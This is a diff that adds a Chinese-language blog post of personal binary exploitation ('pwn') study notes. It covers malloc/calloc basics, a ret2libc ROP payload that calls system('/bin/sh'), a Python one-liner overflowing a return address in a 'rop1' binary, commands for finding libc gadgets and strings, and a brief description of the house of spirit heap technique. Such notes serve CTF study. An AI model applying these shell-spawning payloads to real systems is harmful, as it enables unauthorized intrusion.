@@ -1,0 +1,73 @@
+---
+layout:		post
+title:		linux pwn记录篇
+author:		wooy0ung
+tags:		pwn
+category: 	note
+---
+
+
+>[索引目录]  
+>0x001 house of spirit  
+>0x002 Python  
+<!-- more -->
+
+
+1.分配内存空间函数malloc
+
+　　调用形式： (类型说明符*) malloc (size) 功能：在内存的动态存储区中分配一块长度为"size" 字节的连续区域。函数的返回值为该区域的首地址。 “类型说明符”表示把该区域用于何种数据类型。(类型说明符*)表示把返回值强制转换为该类型指针。“size”是一个无符号数。例如： pc=(char *) malloc (100); 表示分配100个字节的内存空间，并强制转换为字符数组类型， 函数的返回值为指向该字符数组的指针， 把该指针赋予指针变量pc。
+
+2.分配内存空间函数 calloc
+
+　　calloc 也用于分配内存空间。调用形式： (类型说明符*)calloc(n,size) 功能：在内存动态存储区中分配n块长度为“size”字节的连续区域。函数的返回值为该区域的首地址。(类型说明符*)用于强制类型转换。calloc函数与malloc 函数的区别仅在于一次可以分配n块区域。例如： ps=(struet stu*) calloc(2,sizeof (struct stu)); 其中的sizeof(struct stu)是求stu的结构长度。因此该语句的意思是：按stu的长度分配2块连续区域，强制转换为stu类型，并把其首地址赋予指针变量ps。
+
+ malloc它允许从空间内存池中分配内存,malloc()的参数是一个指定所需字节数的整数.
+例如:P=(int*)malloc(n*sizeof(int));
+  colloc与malloc类似,但是主要的区别是存储在已分配的内存空间中的值默认为0,使用malloc时,已分配的内存中可以是任意的值.
+  colloc需要两个参数,第一个是需要分配内存的变量的个数,第二个是每个变量的大小.
+例如:P=(int*)colloc(n,colloc(int));
+
+
+
+
+
+
+readelf -a libc-2.19.so | grep " read@"
+
+strings -a -t x libc-2.19.so | grep "/bin/sh"
+
+
+
+buf = ""
+buf += 'A'*104                          # junk
+buf += pack("<Q", 0x0000004006a3)       # pop rdi; ret;
+buf += pack("<Q", 0x7ffff7b91cdb)       # pointer to "/bin/sh" gets popped into rdi
+buf += pack("<Q", 0x7ffff7a5b640)       # address of system()
+
+
+## 0x001 house of spirit
+
+house of spirit简单的来说就是free一个假的fastbin堆块，然后再下次malloc的时候就会返回该假堆块
+
+```
+ROPgadget --binary bin --string "/bin/sh"
+
+```
+
+
+## 0x002 Python
+
+```
+(python -c 'print "A"*140 + "\xa4\x84\x04\x08"';cat )| ./rop1
+```
+
+## 0x003 linux
+
+```
+x64 0x400000
+```
+
+```
+$ chmod a+x ./linux_server64
+$ ./linux_server64
+```
